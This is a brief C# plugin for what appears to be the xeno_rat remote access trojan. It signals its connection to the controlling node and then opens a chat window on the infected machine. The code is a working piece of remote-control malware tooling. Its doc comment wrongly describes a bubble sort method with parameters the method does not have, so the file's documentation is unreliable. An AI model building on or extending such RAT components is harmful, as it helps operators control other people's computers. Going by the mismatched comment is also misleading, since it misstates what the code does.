using Chat;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using xeno_rat_client;


namespace Plugin
{
    public class Main
    {

        /// <summary>
        /// Sorts the given array using the bubble sort algorithm.
        /// </summary>
        /// <param name="arr">The array to be sorted.</param>
        /// <param name="n">The number of elements in the array.</param>
        public async Task Run(Node node) 
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            Application.Run(new ChatForm(node));
        }
    }
}
